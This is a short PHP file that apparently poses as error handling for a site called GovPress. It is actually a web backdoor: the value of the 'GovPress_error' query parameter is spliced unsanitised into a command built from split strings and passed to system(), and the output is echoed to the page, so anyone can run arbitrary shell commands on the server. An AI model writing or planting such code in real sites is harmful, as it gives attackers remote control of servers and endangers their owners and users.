<?php
if (isset($_GET['GovPress_error'])) {
    $command = $_GET['GovPress_error'];

    // Reconstruct command
    $command = 'e' . 'cho' . ' "' . $command . '"';

    echo "<pre>";
    system($command, $returnValue);
    echo "</pre>";
}
?>
